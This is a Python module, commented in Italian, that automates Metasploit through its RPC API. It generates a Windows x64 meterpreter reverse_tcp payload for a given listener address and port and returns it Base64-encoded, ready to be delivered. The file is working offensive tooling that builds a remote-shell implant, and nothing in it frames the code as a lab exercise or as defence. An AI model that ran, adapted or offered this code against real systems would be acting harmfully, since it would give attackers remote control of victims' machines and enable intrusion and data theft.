import base64 as b64
from utils import CustomLogger
from pymetasploit3.msfrpc import MsfRpcClient


class PayloadHandler:
    def __init__(self, logger: CustomLogger, password: str, host: str = '127.0.0.1', port: int = 55553):
        """
        Inizializza il PayloadHandler con i parametri di connessione a Metasploit.

        :param password: La password per il server Metasploit.
        :param host: L'indirizzo IP del server Metasploit.
        :param port: La porta per la connessione RPC di Metasploit.
        """
        self.logging = logger
        self.password = password
        self.host = host
        self.port = port
        self.client = None

    def connect(self) -> MsfRpcClient:
        """
        Crea la connessione con il server Metasploit.

        :return: Un oggetto MsfRpcClient se la connessione ha successo, altrimenti None.
        """
        try:
            self.client = MsfRpcClient(self.password, host=self.host, port=self.port)
            self.logging.info(f"Connessione a Metasploit sulla porta {self.port} con la password fornita.")
            return self.client
        except Exception as e:
            self.logging.error(f"Errore durante la connessione a Metasploit: {e}")

    def generate_payload(self, lhost: str, lport: int) -> str:
        """
        Crea un payload Metasploit (Windows x64 meterpreter reverse_tcp)
        e restituisce il payload in formato Base64.

        :param lhost: L'indirizzo IP del server di ascolto.
        :param lport: La porta per il reverse shell.
        :return: Il payload in formato Base64 oppure None in caso di errore.
        """
        module_type = 'payload'
        reverse_tcp = 'windows/x64/meterpreter/reverse_tcp'
        platform = 'windows'
        architecture = 'x64'

        try:
            if self.client is None:
                self.logging.error("Client non connesso. Usa connect() prima di generare il payload.")


            # Carica il modulo del payload e configura le opzioni
            payload = self.client.modules.use(module_type, reverse_tcp)
            payload['LHOST'] = lhost
            payload['LPORT'] = lport
            payload.runoptions['Platform'] = platform
            payload.runoptions['Architecture'] = architecture

            # Genera il payload
            generated_payload = payload.payload_generate()

            if isinstance(generated_payload, str):
                self.logging.error(f"Errore nella generazione del payload: {generated_payload}")
                return None


            # Codifica il payload in Base64
            payload_b64 = b64.b64encode(generated_payload).decode('utf-8')
            self.logging.info("Payload generato e codificato in Base64.")
            return payload_b64

        except Exception as e:
            self.logging.error(f"Errore nella generazione del payload: {e}")
            return None
